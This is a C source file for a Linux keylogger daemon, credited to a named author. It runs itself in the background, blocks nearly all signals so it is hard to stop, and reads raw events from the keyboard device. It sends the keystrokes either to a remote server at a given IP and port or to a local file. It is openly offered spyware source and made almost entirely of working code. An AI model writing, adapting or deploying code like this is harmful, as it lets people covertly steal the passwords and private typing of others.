/**Developed by Fabio Cinicolo **/

#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <syslog.h>
#include <stdio.h>
#include <signal.h>
#include <fcntl.h>
#include "daemon.h"
#include "keylogger.h"
#include "network-ipc.h"

#define SOCKET 1
#define FILE 2

int blockAllSignals();
int unblockSignal(int signum);

int main(int argc, char **argv)
{
    int fd, keyboard, flock;
    int file_out_type;

    if (argc != 4 && argc != 3)
        fprintf(stderr, "Usage: ./keylogger-daemon 1 ip port OR ./keylogger-daemon 2 filename\n"), exit(EXIT_FAILURE);

    if (daemonize("keylogger-daemon") < 0) // Convert process to daemon
        syslog(LOG_ERR, "Couldn't start daemon"), exit(EXIT_FAILURE);

    if ((flock = daemonAlreadyRunning())) // If a copy of this daemon is already running we terminate. We return the lock file descriptor
        exit(EXIT_FAILURE);

    if (blockAllSignals() < 0) // Blocking all signals
        syslog(LOG_ERR, "Couldn't set signal bitmask%s", strerror(errno)), exit(EXIT_FAILURE);

    if ((keyboard = findKeyboardDevice(PATH)) < 0) // Looking for Keyboard device driver
        syslog(LOG_ERR, "Couldn't find keyboard device"), exit(EXIT_FAILURE);

    file_out_type = atoi(argv[1]);

    if (file_out_type == SOCKET) // If user decided to send events to server
    {
        char *ip = argv[2];
        short port = atoi(argv[3]);
        if ((fd = openConnectionWithServer(ip, port)) < 0) // Connecting with server
            syslog(LOG_ERR, "Couldn't connect with server, check hostname or try again later: %s", strerror(errno)), exit(EXIT_FAILURE);
        unblockSignal(SIGPIPE); // This signal will allow the daemon to terminate when server shuts down
    }
    else if (file_out_type == FILE) // If user decided to save events locally
    {
        char *file_path = argv[2];
        if ((fd = open(file_path, O_WRONLY | O_CREAT | O_APPEND | O_TRUNC, S_IRUSR)) < 0)
            syslog(LOG_ERR, "Couldn't open file %s: %s", file_path, strerror(errno)), exit(EXIT_FAILURE);
        unblockSignal(SIGTERM); // We can terminate daemon only by sending SIGTERM or SIGKILL/SIGSTOP(not adviced)
    }

    startKeylogger(keyboard, fd); // Reading from keyboard device and sending events to file

    syslog(LOG_INFO, "** Shutting down daemon **");
    close(flock);    // Closing daemon's lock file
    close(keyboard); // Closing keyboard device descriptor
    close(fd);       // Closing socket or file descriptor
    exit(EXIT_SUCCESS);
}

int blockAllSignals()
{
    sigset_t signal_set;
    sigfillset(&signal_set);
    if (sigprocmask(SIG_SETMASK, &signal_set, NULL) < 0)
        return -1;
    return 0;
}

int unblockSignal(int signum)
{

    sigset_t signal_set;
    sigemptyset(&signal_set);
    sigaddset(&signal_set, signum);
    if (sigprocmask(SIG_UNBLOCK, &signal_set, NULL) < 0)
        return -1;
    return 0;
}

// Comando utile per stampare gli ultimi log in syslog lanciati dal daemon : tail -f /var/log/syslog